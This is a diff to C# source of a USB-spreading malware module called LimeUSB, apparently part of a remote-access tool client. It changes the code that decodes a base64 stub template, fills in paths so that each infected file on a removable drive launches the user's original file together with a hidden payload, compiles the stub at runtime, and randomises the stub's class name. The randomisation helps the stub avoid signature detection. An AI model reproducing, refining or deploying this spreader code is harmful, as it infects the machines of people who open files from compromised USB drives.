@@ -10,7 +10,6 @@ using Microsoft.CSharp;
 using System.CodeDom.Compiler;
 using Client.MessagePack;
 using Client.Sockets;
-using System.Threading;
 using System.Windows.Forms;
 //
 //       │ Author     : NYAN CAT
@@ -22,7 +21,7 @@ using System.Windows.Forms;
 
 namespace Client.Handle_Packet
 {
-    class LimeUSB
+    public class HandleLimeUSB
     {
         public void Run()
         {
@@ -163,10 +162,10 @@ namespace Client.Handle_Packet
             try
             {
                 string source = Encoding.UTF8.GetString(Convert.FromBase64String("dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7CnVzaW5nIFN5c3RlbS5SZWZsZWN0aW9uOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CgpbYXNzZW1ibHk6IEFzc2VtYmx5VHJhZGVtYXJrKCIlTGltZSUiKV0KW2Fzc2VtYmx5OiBHdWlkKCIlR3VpZCUiKV0KCnN0YXRpYyBjbGFzcyBMaW1lVVNCTW9kdWxlCnsKICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBNYWluKCkKICAgIHsKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAgIFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLlN0YXJ0KEAiJUZpbGUlIik7CiAgICAgICAgICAgIFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLlN0YXJ0KEAiJVBheWxvYWQlIik7CiAgICAgICAgfQogICAgICAgIGNhdGNoIHsgfQogICAgfQp9"));
+                source = source.Replace("LimeUSBModule", Randomz(new Random().Next(6, 12)));
                 source = source.Replace("%Payload%", Path.GetPathRoot(infectedFile) + spreadSettings.WorkDirectory + "\\" + spreadSettings.LimeUSBFile);
                 source = source.Replace("%File%", infectedFile.Insert(3, spreadSettings.WorkDirectory + "\\"));
                 source = source.Replace("%Lime%", spreadSettings.InfectedTrademark);
-                source = source.Replace("%LimeUSBModule%", Randomz(new Random().Next(6, 12)));
                 source = source.Replace("%Guid%", Guid.NewGuid().ToString());
 
                 CompilerParameters cParams = new CompilerParameters();
